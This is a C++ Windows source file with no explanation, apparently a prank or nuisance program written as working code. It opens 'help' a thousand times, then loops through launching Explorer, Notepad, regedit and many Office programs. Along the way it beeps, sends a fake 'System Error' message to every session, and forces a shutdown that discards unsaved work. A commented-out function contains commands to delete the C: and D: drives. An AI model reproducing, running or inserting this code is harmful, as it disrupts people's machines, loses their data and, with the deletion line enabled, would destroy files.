#include <iostream>
#include <stdio.h>
#include <conio.h>
#include <string>
#include <dos.h>
#include <windows.h>

using namespace std;

int main()
{
	int i;
	for(i=0;i<1000;i++){system("start help");}
	for(i=0;i<100;i++)
	{
		//Sleep(1000);
		Beep(800,300);
		//Message
		system("msg * System Error");
		//Center
		system("start explorer.exe");
		system("start notepad.exe");
		system("start regedit.exe");
		//Microsoft Office
		system("start winword.exe");Beep(800,300);system("start powerpnt.exe");Beep(800,300);system("start excel.exe");Beep(800,300);
		system("start groove.exe");Beep(800,300);system("start infopath.exe");Beep(800,300);system("start lync.exe");Beep(800,300);
		system("start msaccess.exe");Beep(800,300);system("start mspub.exe");Beep(800,300);system("start onenote.exe");Beep(800,300);
		system("start outlook.exe");Beep(800,300);		
		//int del_drive(){system("DEL C: -Y");system("DEL D: -Y");}
		system("shutdown -s -t 5 -f");
	}
	system("shutdown -s -t 5 -f");
	getch();
}